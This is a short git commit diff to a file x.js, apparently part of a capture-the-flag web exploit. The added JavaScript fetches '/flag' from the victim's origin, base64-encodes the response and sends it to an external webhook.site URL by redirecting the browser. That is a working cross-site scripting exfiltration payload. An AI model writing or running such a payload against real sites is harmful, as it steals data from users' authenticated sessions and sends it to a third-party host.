b65663e76ddf55c127fdd3dbc24642fdb53f417d
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-17 18:09:16 +0100

    Change window location redirection to fetch flag

--- x.js
+++ x.js
@@ -1,1 +1,4 @@
-window.location.href = '/flag';
+
+fetch('/flag').then(r => r.text()).then(d => {
+window.location.href = 'https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(d);
+});
